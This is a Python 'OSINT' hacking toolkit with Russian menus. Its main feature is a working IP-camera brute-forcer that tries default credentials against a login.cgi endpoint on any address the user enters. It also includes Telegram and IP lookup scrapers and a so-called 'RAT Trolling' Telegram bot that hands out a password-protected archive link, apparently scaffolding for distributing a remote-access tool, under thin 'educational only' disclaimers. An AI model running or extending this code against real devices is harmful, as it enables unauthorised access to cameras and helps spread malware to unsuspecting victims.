import os
import time
import requests
import telebot
import socket
import random
from bs4 import BeautifulSoup
from colorama import Fore, init, Style
from telebot import types

# Инициализация цветов
init()

# Глобальные переменные
bot = None
ADMIN_ID = None  # Ваш Telegram ID (узнать через @userinfobot)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    print(Fore.CYAN + r"""
  ______ _      __  __          ___   _   _ _______ 
 |  ____| |    |  \/  |   /\   / _ \ | \ | |__   __|
 | |__  | |    | \  / |  /  \ | | | ||  \| |  | |   
 |  __| | |    | |\/| | / /\ \| | | || . ` |  | |   
 | |____| |____| |  | |/ ____ \ |_| || |\  |  | |   
 |______|______|_|  |_/_/    \_\___/ |_| \_|  |_|   
""" + Fore.RESET)
    print(Fore.BLUE + "=" * 60)
    print(" FLEXYAL OSINT TOOL - Инструмент для кибербезопасности")
    print("=" * 60 + Fore.RESET)
    print("\n")

def camera_bruteforce():
    clear_screen()
    print(Fore.YELLOW + "\n[+] Брутфорс камер (базовая проверка уязвимостей)" + Fore.RESET)
    
    target = input("Введите URL/IP камеры: ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    common_credentials = [
        ('admin', 'admin'),
        ('admin', '12345'),
        ('admin', 'password'),
        ('root', 'root'),
        ('user', 'user')
    ]
    
    print(Fore.CYAN + f"\n[+] Проверяем {target} на стандартные учетные данные..." + Fore.RESET)
    
    for username, password in common_credentials:
        try:
            session = requests.Session()
            login_url = f"{target}/cgi-bin/login.cgi"
            data = {
                'username': username,
                'password': password
            }
            response = session.post(login_url, data=data, timeout=5)
            
            if "success" in response.text.lower():
                print(Fore.GREEN + f"[+] Успех! Логин: {username} Пароль: {password}" + Fore.RESET)
                return
            else:
                print(Fore.RED + f"[-] Неверно: {username}:{password}" + Fore.RESET)
                
        except Exception as e:
            print(Fore.RED + f"[-] Ошибка при проверке {username}:{password} - {str(e)}" + Fore.RESET)
            continue
    
    print(Fore.YELLOW + "\n[!] Стандартные учетные данные не подошли" + Fore.RESET)
    input("\nНажмите Enter для продолжения...")

def telegram_osint():
    clear_screen()
    print(Fore.YELLOW + "\n[+] Telegram OSINT инструменты" + Fore.RESET)
    
    print("\n1. Поиск информации о пользователе")
    print("2. Проверка номера телефона")
    print("3. Поиск в публичных каналах")
    print("0. Назад")
    
    choice = input("\nВыберите опцию: ")
    
    if choice == "1":
        username = input("Введите username пользователя (@username): ").strip('@')
        print(Fore.CYAN + f"\n[+] Ищем информацию о @{username}..." + Fore.RESET)
        
        try:
            url = f"https://telegago.com/search?q=@{username}"
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            results = soup.find_all('div', class_='result-item')
            if results:
                print(Fore.GREEN + f"[+] Найдены публичные сообщения от @{username}:" + Fore.RESET)
                for item in results[:3]:
                    print(f"- {item.text[:100]}...")
                    print(f"  Ссылка: {item.find('a')['href']}\n")
            else:
                print(Fore.RED + f"[-] Публичных сообщений от @{username} не найдено" + Fore.RESET)
                
        except Exception as e:
            print(Fore.RED + f"[-] Ошибка при поиске: {str(e)}" + Fore.RESET)
            
    elif choice == "2":
        phone = input("Введите номер телефона (с кодом страны): ").strip()
        print(Fore.CYAN + f"\n[+] Проверяем номер {phone}..." + Fore.RESET)
        print(Fore.YELLOW + "[!] Эта функция требует доступ к API Telegram" + Fore.RESET)
        
    elif choice == "3":
        query = input("Введите поисковый запрос: ").strip()
        print(Fore.CYAN + f"\n[+] Ищем '{query}' в публичных каналах..." + Fore.RESET)
        
        try:
            url = f"https://tgstat.com/search?q={query}"
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            channels = soup.select('.channel-item')
            if channels:
                print(Fore.GREEN + f"[+] Найдены каналы по запросу '{query}':" + Fore.RESET)
                for channel in channels[:3]:
                    name = channel.select_one('.channel-name').text
                    members = channel.select_one('.channel-members').text
                    print(f"- {name} ({members})")
                    print(f"  Описание: {channel.select_one('.channel-description').text[:80]}...\n")
            else:
                print(Fore.RED + f"[-] Каналы по запросу '{query}' не найдены" + Fore.RESET)
                
        except Exception as e:
            print(Fore.RED + f"[-] Ошибка при поиске: {str(e)}" + Fore.RESET)
            
    input("\nНажмите Enter для продолжения...")

def ip_osint():
    clear_screen()
    print(Fore.YELLOW + "\n[+] IP-OSINT инструменты" + Fore.RESET)
    
    ip = input("Введите IP-адрес для проверки: ").strip()
    
    print(Fore.CYAN + f"\n[+] Собираем информацию об {ip}..." + Fore.RESET)
    
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        data = response.json()
        
        print(Fore.GREEN + "[+] Основная информация:" + Fore.RESET)
        print(f"IP: {data.get('ip', 'N/A')}")
        print(f"Хост: {data.get('hostname', 'N/A')}")
        print(f"Город: {data.get('city', 'N/A')}")
        print(f"Регион: {data.get('region', 'N/A')}")
        print(f"Страна: {data.get('country', 'N/A')}")
        print(f"Провайдер: {data.get('org', 'N/A')}")
        
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка при получении информации: {str(e)}" + Fore.RESET)
    
    input("\nНажмите Enter для продолжения...")

def rat_trolling():
    clear_screen()
    print(Fore.RED + "\n[!] RAT Trolling Module (Educational Purposes Only!)" + Fore.RESET)
    print(Fore.YELLOW + "[!] Для работы требуется Telegram бот" + Fore.RESET)
    
    global bot, ADMIN_ID
    token = input("\nВведите токен вашего Telegram бота: ").strip()
    ADMIN_ID = input("Введите ваш Telegram ID (получить через @userinfobot): ").strip()
    
    try:
        bot = telebot.TeleBot(token)
        print(Fore.GREEN + "[+] Бот успешно инициализирован!" + Fore.RESET)
        
        @bot.message_handler(commands=['start'])
        def handle_start(message):
            if str(message.from_user.id) != ADMIN_ID:
                bot.send_message(message.chat.id, "⛔ Доступ запрещен!")
                return
                
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            btn_yes = types.KeyboardButton("✅ Да, я согласен")
            markup.add(btn_yes)
            
            bot.send_message(
                message.chat.id,
                "🔐 *Flexyal RAT Troll Module*\n\n"
                "Этот инструмент предназначен только для:\n"
                "- Этичного хакинга\n"
                "- Тестирования с разрешения\n"
                "- Образовательных целей\n\n"
                "Вы соглашаетесь с правилами?",
                reply_markup=markup,
                parse_mode="Markdown"
            )
        
        @bot.message_handler(func=lambda m: m.text == "✅ Да, я согласен")
        def handle_agree(message):
            archive_link = "https://example.com/safe_archive.zip"  # Замените на реальный безопасный архив
            password = f"Flexyal{random.randint(1000,9999)}"
            
            bot.send_message(
                message.chat.id,
                f"📦 *Инструкция (Educational Only!):*\n\n"
                f"1. Скачайте тестовый архив: [ссылка]({archive_link})\n"
                f"2. Пароль: `{password}`\n"
                f"3. Это пример легального использования\n\n"
                f"⚠️ Настоящий RAT требует письменного разрешения!",
                parse_mode="Markdown",
                disable_web_page_preview=True
            )
        
        print(Fore.GREEN + "\n[+] Бот запущен. Остановите через Ctrl+C" + Fore.RESET)
        bot.polling()
        
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}" + Fore.RESET)
        input("Нажмите Enter чтобы вернуться...")

def main_menu():
    while True:
        clear_screen()
        display_banner()
        
        print(Fore.GREEN + "Главное меню:" + Fore.RESET)
        print("1. Брутфорс камер")
        print("2. Telegram OSINT")
        print("3. IP-OSINT")
        print("4. RAT Trolling (Educational)")
        print("0. Выход")
        
        choice = input("\nВыберите опцию: ")
        
        if choice == "1":
            camera_bruteforce()
        elif choice == "2":
            telegram_osint()
        elif choice == "3":
            ip_osint()
        elif choice == "4":
            rat_trolling()
        elif choice == "0":
            print(Fore.CYAN + "\n[+] Выход из программы..." + Fore.RESET)
            break
        else:
            print(Fore.RED + "\n[!] Неверный выбор, попробуйте снова." + Fore.RESET)
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Программа прервана пользователем." + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"\n[!] Произошла ошибка: {str(e)}" + Fore.RESET)
